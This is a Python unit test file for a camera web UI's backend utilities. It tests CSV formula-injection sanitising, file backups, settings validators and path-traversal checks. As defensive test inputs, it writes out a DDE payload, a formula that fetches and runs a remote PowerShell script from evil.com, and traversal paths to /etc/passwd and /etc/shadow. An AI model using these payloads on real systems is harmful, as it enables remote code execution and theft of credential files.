"""
Unit tests for webui/backend/utils.py shared utility functions

Tests cover security-critical functions including CSV injection prevention,
file backup utilities, and path traversal protection.
"""

import pytest
import sys
from pathlib import Path

# Add the webui backend to the Python path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "webui" / "backend"))

from utils import (
    sanitize_csv_value,
    _validate_int_enum,
    _validate_exposure_time,
    _validate_noise_reduction_mode,
    ALLOWED_CAMERA_SETTINGS,
    ALLOWED_LIVEVIEW_SETTINGS,
    create_backup,
    validate_path_within_directory
)
import tempfile
import shutil as shutil_module
import time


class TestSanitizeCSVValue:
    """Test CSV injection prevention and sanitization"""

    # ========================================================================
    # Formula Injection Prevention Tests
    # ========================================================================

    def test_sanitize_formula_equals(self):
        """Should prefix formulas starting with = to prevent injection"""
        result = sanitize_csv_value("=SUM(A1:A10)")
        assert result == "'=SUM(A1:A10)"

    def test_sanitize_formula_plus(self):
        """Should prefix formulas starting with + to prevent injection"""
        result = sanitize_csv_value("+1234")
        assert result == "'+1234"

    def test_sanitize_formula_minus(self):
        """Should prefix formulas starting with - to prevent injection"""
        result = sanitize_csv_value("-1234")
        assert result == "'-1234"

    def test_sanitize_formula_at(self):
        """Should prefix formulas starting with @ to prevent injection"""
        result = sanitize_csv_value("@SUM(A1:A10)")
        assert result == "'@SUM(A1:A10)"

    def test_sanitize_formula_tab(self):
        """Should prefix values starting with tab to prevent injection"""
        result = sanitize_csv_value("\tmalicious")
        assert result == "'\tmalicious"

    def test_sanitize_formula_carriage_return(self):
        """Should prefix values starting with CR to prevent injection and remove CR"""
        result = sanitize_csv_value("\rmalicious")
        # CR is both prefixed AND replaced with space
        assert result == "' malicious"

    def test_sanitize_complex_formula(self):
        """Should handle complex Excel formulas"""
        result = sanitize_csv_value("=HYPERLINK(\"http://evil.com\",\"Click me\")")
        assert result == "'=HYPERLINK(\"http://evil.com\",\"Click me\")"

    # ========================================================================
    # Newline/Control Character Removal Tests
    # ========================================================================

    def test_sanitize_newline(self):
        """Should replace newlines with spaces"""
        result = sanitize_csv_value("Line 1\nLine 2")
        assert result == "Line 1 Line 2"
        assert '\n' not in result

    def test_sanitize_carriage_return_in_middle(self):
        """Should replace carriage returns with spaces"""
        result = sanitize_csv_value("Line 1\rLine 2")
        assert result == "Line 1 Line 2"
        assert '\r' not in result

    def test_sanitize_crlf(self):
        """Should replace Windows line endings (CRLF) with spaces"""
        result = sanitize_csv_value("Line 1\r\nLine 2")
        assert result == "Line 1  Line 2"
        assert '\r' not in result
        assert '\n' not in result

    def test_sanitize_multiple_newlines(self):
        """Should replace all newlines with spaces"""
        result = sanitize_csv_value("A\nB\nC\nD")
        assert result == "A B C D"

    # ========================================================================
    # Length Limiting Tests (DoS Prevention)
    # ========================================================================

    def test_sanitize_length_under_limit(self):
        """Should not modify strings under 1000 characters"""
        short_text = "A" * 999
        result = sanitize_csv_value(short_text)
        assert result == short_text
        assert len(result) == 999

    def test_sanitize_length_at_limit(self):
        """Should not modify strings exactly at 1000 characters"""
        exact_text = "A" * 1000
        result = sanitize_csv_value(exact_text)
        assert result == exact_text
        assert len(result) == 1000

    def test_sanitize_length_over_limit(self):
        """Should truncate strings over 1000 characters"""
        long_text = "A" * 2000
        result = sanitize_csv_value(long_text)
        assert len(result) == 1000
        assert result == "A" * 1000

    def test_sanitize_length_massive_string(self):
        """Should truncate very large strings to prevent DoS"""
        massive_text = "X" * 1000000
        result = sanitize_csv_value(massive_text)
        assert len(result) == 1000

    # ========================================================================
    # Type Handling Tests
    # ========================================================================

    def test_sanitize_string(self):
        """Should handle string input"""
        result = sanitize_csv_value("Normal text")
        assert result == "Normal text"

    def test_sanitize_integer(self):
        """Should convert integers to strings"""
        result = sanitize_csv_value(42)
        assert result == "42"

    def test_sanitize_float(self):
        """Should convert floats to strings"""
        result = sanitize_csv_value(3.14159)
        assert result == "3.14159"

    def test_sanitize_boolean_true(self):
        """Should convert True to string"""
        result = sanitize_csv_value(True)
        assert result == "True"

    def test_sanitize_boolean_false(self):
        """Should convert False to string"""
        result = sanitize_csv_value(False)
        assert result == "False"

    def test_sanitize_none(self):
        """Should convert None to string"""
        result = sanitize_csv_value(None)
        assert result == "None"

    def test_sanitize_negative_number(self):
        """Should handle negative numbers (prefix with quote since starts with -)"""
        result = sanitize_csv_value(-42)
        assert result == "'-42"

    # ========================================================================
    # Edge Cases and Special Characters
    # ========================================================================

    def test_sanitize_empty_string(self):
        """Should handle empty strings"""
        result = sanitize_csv_value("")
        assert result == ""

    def test_sanitize_whitespace_only(self):
        """Should preserve whitespace-only strings"""
        result = sanitize_csv_value("   ")
        assert result == "   "

    def test_sanitize_unicode(self):
        """Should handle Unicode characters"""
        result = sanitize_csv_value("Hello 世界 🌍")
        assert result == "Hello 世界 🌍"

    def test_sanitize_special_chars(self):
        """Should preserve safe special characters unless they start the string"""
        result = sanitize_csv_value("!@#$%^&*()")
        # String doesn't start with dangerous char, so no prefix
        assert result == "!@#$%^&*()"

        # But @ at the START is dangerous
        result2 = sanitize_csv_value("@#$%^&*()")
        assert result2 == "'@#$%^&*()"

    def test_sanitize_quotes(self):
        """Should preserve quotes in content"""
        result = sanitize_csv_value('She said "Hello"')
        assert result == 'She said "Hello"'

    def test_sanitize_commas(self):
        """Should preserve commas (CSV will handle escaping)"""
        result = sanitize_csv_value("Value1, Value2, Value3")
        assert result == "Value1, Value2, Value3"

    # ========================================================================
    # Combined Attack Vectors
    # ========================================================================

    def test_sanitize_formula_with_newlines(self):
        """Should handle formulas with newlines"""
        result = sanitize_csv_value("=SUM(\nA1:A10)")
        assert result == "'=SUM( A1:A10)"
        assert '\n' not in result

    def test_sanitize_long_formula(self):
        """Should handle long formulas (prefix then truncate after 1000 chars total)"""
        # The formula is 1201 chars: = (1) + A1+ (3) * 300 = 901, so total = 1 + 900 = 901
        # After prefixing with ' it becomes 902 chars, which is under 1000, so no truncation
        long_formula = "=" + "A1+" * 300  # = 1 + 900 = 901 chars
        result = sanitize_csv_value(long_formula)
        assert result.startswith("'=")
        # Actually this is 902 chars (901 original + 1 quote), under limit
        assert len(result) == 902

        # Test actual truncation with truly long string
        very_long = "=" + "X" * 2000  # 2001 chars
        result2 = sanitize_csv_value(very_long)
        assert len(result2) == 1000  # Truncated to 1000
        assert result2.startswith("'=")  # Still prefixed

    def test_sanitize_normal_minus_sign_in_middle(self):
        """Should NOT prefix values with minus sign in middle"""
        result = sanitize_csv_value("This is a - normal text")
        assert result == "This is a - normal text"
        assert not result.startswith("'")

    def test_sanitize_camera_setting_value(self):
        """Should handle typical camera setting values"""
        result = sanitize_csv_value("1280x720")
        assert result == "1280x720"

    def test_sanitize_filepath(self):
        """Should handle file paths"""
        result = sanitize_csv_value("/home/mothbox/photos/image.jpg")
        assert result == "/home/mothbox/photos/image.jpg"

    def test_sanitize_url(self):
        """Should handle URLs"""
        result = sanitize_csv_value("https://example.com/path?query=value")
        assert result == "https://example.com/path?query=value"

    # ========================================================================
    # Security Regression Tests
    # ========================================================================

    def test_sanitize_dde_injection(self):
        """Should prevent DDE (Dynamic Data Exchange) injection"""
        dde_payload = "@SUM(1+1)*cmd|'/c calc'!A1"
        result = sanitize_csv_value(dde_payload)
        assert result.startswith("'")

    def test_sanitize_cmd_injection_attempt(self):
        """Should prefix command injection attempts"""
        cmd_payload = "=cmd|'/c powershell IEX(wget evil.com/shell.ps1)'"
        result = sanitize_csv_value(cmd_payload)
        assert result.startswith("'=")

    def test_sanitize_hyperlink_injection(self):
        """Should prefix hyperlink formula injection"""
        hyperlink = '=HYPERLINK("http://evil.com","Click")'
        result = sanitize_csv_value(hyperlink)
        assert result.startswith("'=")


class TestValidateIntEnum:
    """Test integer enum validation helper"""

    def test_valid_int_in_set(self):
        """Should accept valid integers"""
        assert _validate_int_enum(0, [0, 1, 2]) == True
        assert _validate_int_enum(1, [0, 1, 2]) == True
        assert _validate_int_enum(2, [0, 1, 2]) == True

    def test_invalid_int_not_in_set(self):
        """Should reject integers not in allowed set"""
        assert _validate_int_enum(3, [0, 1, 2]) == False
        assert _validate_int_enum(-1, [0, 1, 2]) == False

    def test_string_digit_conversion(self):
        """Should convert string digits to int"""
        assert _validate_int_enum("1", [0, 1, 2]) == True

    def test_reject_float(self):
        """Should reject float values"""
        with pytest.raises(TypeError, match="Float not allowed"):
            _validate_int_enum(1.0, [0, 1, 2])

    def test_reject_boolean(self):
        """Should reject boolean values"""
        with pytest.raises(TypeError, match="Boolean not allowed"):
            _validate_int_enum(True, [0, 1, 2])


class TestValidateExposureTime:
    """Test exposure time validation"""

    def test_valid_exposure_int(self):
        """Should accept valid integer exposure times"""
        assert _validate_exposure_time(1000) == True  # 1ms
        assert _validate_exposure_time(10000) == True  # 10ms
        assert _validate_exposure_time(999999) == True  # Just under 1s

    def test_valid_exposure_string(self):
        """Should accept valid string digits"""
        assert _validate_exposure_time("50000") == True

    def test_reject_none(self):
        """Should reject None"""
        with pytest.raises(TypeError, match="None not allowed"):
            _validate_exposure_time(None)

    def test_reject_boolean(self):
        """Should reject boolean"""
        with pytest.raises(TypeError, match="Boolean not allowed"):
            _validate_exposure_time(True)

    def test_reject_too_long(self):
        """Should reject exposure times >= 1 second"""
        assert _validate_exposure_time(1000000) == False  # 1s
        assert _validate_exposure_time(2000000) == False  # 2s

    def test_reject_zero_or_negative(self):
        """Should reject zero or negative values"""
        assert _validate_exposure_time(0) == False
        assert _validate_exposure_time(-1000) == False

    def test_reject_invalid_string(self):
        """Should reject non-digit strings"""
        with pytest.raises(ValueError, match="must be integer or digit string"):
            _validate_exposure_time("not_a_number")


class TestValidateNoiseReductionMode:
    """Test noise reduction mode validation"""

    def test_valid_int_values(self):
        """Should accept valid integer modes"""
        assert _validate_noise_reduction_mode(0) == True  # Off
        assert _validate_noise_reduction_mode(1) == True  # Fast
        assert _validate_noise_reduction_mode(2) == True  # High Quality

    def test_valid_string_values(self):
        """Should accept valid string digit modes"""
        assert _validate_noise_reduction_mode("0") == True
        assert _validate_noise_reduction_mode("1") == True
        assert _validate_noise_reduction_mode("2") == True

    def test_invalid_int(self):
        """Should reject invalid integer values"""
        assert _validate_noise_reduction_mode(3) == False
        assert _validate_noise_reduction_mode(-1) == False

    def test_invalid_string(self):
        """Should reject invalid string values"""
        assert _validate_noise_reduction_mode("3") == False
        assert _validate_noise_reduction_mode("invalid") == False
        assert _validate_noise_reduction_mode("") == False


class TestCameraSettingsSchema:
    """Test camera settings validation schema"""

    def test_schema_exists(self):
        """Should have camera settings schema"""
        assert ALLOWED_CAMERA_SETTINGS is not None
        assert isinstance(ALLOWED_CAMERA_SETTINGS, dict)

    def test_sharpness_validation(self):
        """Should validate sharpness range"""
        validator = ALLOWED_CAMERA_SETTINGS['Sharpness']
        assert validator(0.0) == True
        assert validator(2.0) == True
        assert validator(4.0) == True
        assert validator(4.1) == False
        assert validator(-0.1) == False

    def test_brightness_validation(self):
        """Should validate brightness range"""
        validator = ALLOWED_CAMERA_SETTINGS['Brightness']
        assert validator(-1.0) == True
        assert validator(0.0) == True
        assert validator(1.0) == True
        assert validator(-1.1) == False
        assert validator(1.1) == False

    def test_exposure_time_validation(self):
        """Should validate exposure time"""
        validator = ALLOWED_CAMERA_SETTINGS['ExposureTime']
        assert validator(10000) == True  # 10ms
        assert validator("50000") == True  # 50ms string
        assert validator(1000000) == False  # Too long

    def test_af_mode_validation(self):
        """Should validate autofocus mode"""
        validator = ALLOWED_CAMERA_SETTINGS['AfMode']
        assert validator(0) == True  # Manual
        assert validator(1) == True  # Auto Single
        assert validator(2) == True  # Continuous
        assert validator(3) == False

    @pytest.mark.skip(reason="HDR validator not yet implemented - TDD placeholder")
    def test_hdr_validation(self):
        """Should validate HDR bracket count"""
        validator = ALLOWED_CAMERA_SETTINGS['HDR']
        assert validator(1) == True
        assert validator(3) == True
        assert validator(5) == True
        assert validator(7) == True
        assert validator(2) == False  # Must be odd
        assert validator(4) == False

    @pytest.mark.skip(reason="FocusBracket validator not yet implemented - TDD placeholder")
    def test_focus_bracket_validation(self):
        """Should validate focus bracket count"""
        validator = ALLOWED_CAMERA_SETTINGS['FocusBracket']
        assert validator(1) == True
        assert validator(5) == True
        assert validator(10) == True
        assert validator(0) == False
        assert validator(11) == False

    def test_boolean_settings(self):
        """Should validate boolean settings"""
        validator = ALLOWED_CAMERA_SETTINGS['AeEnable']
        assert validator('true') == True
        assert validator('false') == True
        assert validator('True') == True  # Case insensitive
        assert validator('FALSE') == True
        assert validator('invalid') == False

    @pytest.mark.skip(reason="HDR and FocusBracket validators not yet implemented - TDD placeholder")
    def test_all_settings_have_validators(self):
        """Should have validators for all expected settings"""
        expected_settings = [
            'Sharpness', 'Brightness', 'Contrast', 'Saturation',
            'ExposureTime', 'ExposureValue', 'AnalogueGain', 'AeEnable',
            'AfMode', 'AfSpeed', 'AfRange', 'LensPosition',
            'AwbEnable', 'AwbMode', 'HDR', 'FocusBracket'
        ]
        for setting in expected_settings:
            assert setting in ALLOWED_CAMERA_SETTINGS


class TestLiveviewSettingsSchema:
    """Test liveview settings validation schema"""

    def test_schema_exists(self):
        """Should have liveview settings schema"""
        assert ALLOWED_LIVEVIEW_SETTINGS is not None
        assert isinstance(ALLOWED_LIVEVIEW_SETTINGS, dict)

    def test_boolean_controls(self):
        """Should validate boolean enable/disable controls"""
        validator = ALLOWED_LIVEVIEW_SETTINGS['focus_peaking_enabled']
        assert validator('true') == True
        assert validator('false') == True
        assert validator('True') == True
        assert validator('invalid') == False

    @pytest.mark.skip(reason="stream_width/stream_height validators not yet implemented - TDD placeholder")
    def test_stream_dimensions(self):
        """Should validate stream width/height"""
        width_validator = ALLOWED_LIVEVIEW_SETTINGS['stream_width']
        assert width_validator(640) == True
        assert width_validator(1920) == True
        assert width_validator(639) == False  # Too small
        assert width_validator(1921) == False  # Too large

        height_validator = ALLOWED_LIVEVIEW_SETTINGS['stream_height']
        assert height_validator(480) == True
        assert height_validator(1080) == True
        assert height_validator(479) == False
        assert height_validator(1081) == False

    @pytest.mark.skip(reason="stream_quality validator not yet implemented - TDD placeholder")
    def test_stream_quality(self):
        """Should validate JPEG quality"""
        validator = ALLOWED_LIVEVIEW_SETTINGS['stream_quality']
        assert validator(1) == True
        assert validator(50) == True
        assert validator(100) == True
        assert validator(0) == False
        assert validator(101) == False

    def test_float_controls(self):
        """Should validate float-based controls"""
        validator = ALLOWED_LIVEVIEW_SETTINGS['sharpness']
        assert validator(0.0) == True
        assert validator(2.5) == True
        assert validator(4.0) == True
        assert validator(-0.1) == False
        assert validator(4.1) == False

    def test_mode_integers(self):
        """Should validate mode integers"""
        validator = ALLOWED_LIVEVIEW_SETTINGS['af_mode']
        assert validator(0) == True
        assert validator(1) == True
        assert validator(2) == True
        assert validator(3) == False

    def test_color_gains(self):
        """Should validate color gain ranges"""
        red_validator = ALLOWED_LIVEVIEW_SETTINGS['colour_gains_red']
        blue_validator = ALLOWED_LIVEVIEW_SETTINGS['colour_gains_blue']

        assert red_validator(1.0) == True
        assert red_validator(2.5) == True
        assert red_validator(4.0) == True
        assert red_validator(0.9) == False
        assert red_validator(4.1) == False

        assert blue_validator(1.0) == True
        assert blue_validator(4.0) == True

    @pytest.mark.skip(reason="focus_peaking validators not yet implemented - TDD placeholder")
    def test_focus_peaking_config(self):
        """Should validate focus peaking configuration"""
        intensity_validator = ALLOWED_LIVEVIEW_SETTINGS['focus_peaking_intensity']
        assert intensity_validator(0.0) == True
        assert intensity_validator(100.0) == True
        assert intensity_validator(200.0) == True
        assert intensity_validator(-0.1) == False
        assert intensity_validator(200.1) == False

        color_validator = ALLOWED_LIVEVIEW_SETTINGS['focus_peaking_colour']
        assert color_validator('green') == True
        assert color_validator('red') == True
        assert color_validator('yellow') == True
        assert color_validator('cyan') == True
        assert color_validator('magenta') == True
        assert color_validator('blue') == False  # Not in list

        algo_validator = ALLOWED_LIVEVIEW_SETTINGS['focus_peaking_algorithm']
        assert algo_validator('laplacian') == True
        assert algo_validator('sobel') == True
        assert algo_validator('canny') == True
        assert algo_validator('invalid') == False


class TestCreateBackup:
    """Test file backup creation and management"""

    def test_backup_creates_file(self):
        """Should create backup file with timestamp"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create test file
            test_file = Path(tmpdir) / "test.csv"
            test_file.write_text("test data")

            # Create backup
            backup_path = create_backup(test_file)

            # Verify backup exists
            assert backup_path is not None
            assert backup_path.exists()
            assert backup_path.read_text() == "test data"
            assert ".backup." in str(backup_path)

    def test_backup_naming_format(self):
        """Should use correct naming format"""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "settings.csv"
            test_file.write_text("data")

            backup_path = create_backup(test_file)

            # Format: settings.csv.backup.YYYYMMDD_HHMMSS
            assert backup_path.name.startswith("settings.csv.backup.")
            # Check timestamp format (8 digits + underscore + 6 digits)
            timestamp = backup_path.name.split(".backup.")[1]
            assert len(timestamp) == 15  # YYYYMMDD_HHMMSS
            assert timestamp[8] == "_"

    def test_backup_cleanup_old_backups(self):
        """Should keep only specified number of backups"""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "test.txt"
            test_file.write_text("v1")

            # Create 5 backups (with delays to ensure different timestamps)
            for i in range(5):
                test_file.write_text(f"v{i}")
                create_backup(test_file, keep=3)
                time.sleep(1.1)  # Ensure different timestamps (format is by second)

            # Count backups
            backups = list(Path(tmpdir).glob("test.txt.backup.*"))
            assert len(backups) == 3  # Should only keep 3 most recent

    def test_backup_nonexistent_file(self):
        """Should return None for nonexistent file"""
        nonexistent = Path("/tmp/does_not_exist_12345.txt")
        result = create_backup(nonexistent)
        assert result is None

    def test_backup_preserves_content(self):
        """Should preserve exact file content"""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "data.json"
            test_content = '{"key": "value", "number": 42}'
            test_file.write_text(test_content)

            backup_path = create_backup(test_file)

            assert backup_path.read_text() == test_content

    def test_backup_custom_keep_count(self):
        """Should respect custom keep parameter"""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "test.csv"
            test_file.write_text("data")

            # Create 4 backups, keeping only 2
            for i in range(4):
                create_backup(test_file, keep=2)
                time.sleep(1.1)  # Ensure different timestamps (format is by second)

            backups = list(Path(tmpdir).glob("test.csv.backup.*"))
            assert len(backups) == 2

    def test_backup_different_extensions(self):
        """Should handle files with different extensions"""
        with tempfile.TemporaryDirectory() as tmpdir:
            for ext in ['.txt', '.csv', '.json', '.conf', '']:
                test_file = Path(tmpdir) / f"file{ext}"
                test_file.write_text("data")

                backup_path = create_backup(test_file)
                assert backup_path is not None
                assert backup_path.exists()


class TestValidatePathWithinDirectory:
    """Test path traversal protection"""

    def test_valid_path_within_directory(self):
        """Should accept paths within base directory"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            subdir = base_dir / "subdir"
            subdir.mkdir()

            # Valid path
            result = validate_path_within_directory(Path("subdir/file.txt"), base_dir)
            assert result == base_dir / "subdir" / "file.txt"

    def test_reject_path_traversal_parent(self):
        """Should reject path traversal with ../ """
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir) / "photos"
            base_dir.mkdir()

            # Attempt to traverse to parent
            with pytest.raises(ValueError):
                validate_path_within_directory(Path("../../../etc/passwd"), base_dir)

    def test_reject_absolute_path_outside(self):
        """Should reject absolute paths outside base_dir"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir) / "safe"
            base_dir.mkdir()

            # Try absolute path outside base_dir
            with pytest.raises(ValueError):
                validate_path_within_directory(Path("/etc/passwd"), base_dir)

    def test_nested_subdirectories(self):
        """Should accept deeply nested valid paths"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            deep_dir = base_dir / "a" / "b" / "c" / "d"
            deep_dir.mkdir(parents=True)

            result = validate_path_within_directory(Path("a/b/c/d/file.txt"), base_dir)
            assert result == deep_dir / "file.txt"

    def test_path_with_dots_in_filename(self):
        """Should accept filenames containing dots"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)

            # Filename with dots is fine (not path traversal)
            result = validate_path_within_directory(Path("file.backup.txt"), base_dir)
            assert result == base_dir / "file.backup.txt"

    def test_current_directory_reference(self):
        """Should handle ./ references"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)

            result = validate_path_within_directory(Path("./file.txt"), base_dir)
            assert result == base_dir / "file.txt"

    def test_complex_traversal_attempt(self):
        """Should reject complex traversal attempts"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir) / "restricted"
            base_dir.mkdir()

            # Try various traversal techniques
            traversal_attempts = [
                "../../../etc/passwd",
                "subdir/../../../../../../etc/shadow",
                "../outside/file.txt",
            ]

            for attempt in traversal_attempts:
                with pytest.raises(ValueError):
                    validate_path_within_directory(Path(attempt), base_dir)

    def test_returns_resolved_absolute_path(self):
        """Should return fully resolved absolute path"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)
            subdir = base_dir / "photos"
            subdir.mkdir()

            result = validate_path_within_directory(Path("photos/image.jpg"), base_dir)

            # Should be absolute
            assert result.is_absolute()
            # Should be resolved (no .. or . components)
            assert ".." not in str(result)
            assert result == base_dir / "photos" / "image.jpg"

    def test_symlink_within_directory(self):
        """Should resolve symlinks and validate final location"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir) / "safe"
            base_dir.mkdir()

            # Create a symlink within the base directory
            target = base_dir / "target.txt"
            target.write_text("data")
            link = base_dir / "link.txt"
            link.symlink_to(target)

            # Should resolve symlink and verify it's within base_dir
            result = validate_path_within_directory(Path("link.txt"), base_dir)
            assert result == target

    def test_empty_path_component(self):
        """Should handle paths with empty components (e.g., double slashes)"""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir)

            # Path with double slash gets normalized
            result = validate_path_within_directory(Path("subdir//file.txt"), base_dir)
            assert result == base_dir / "subdir" / "file.txt"
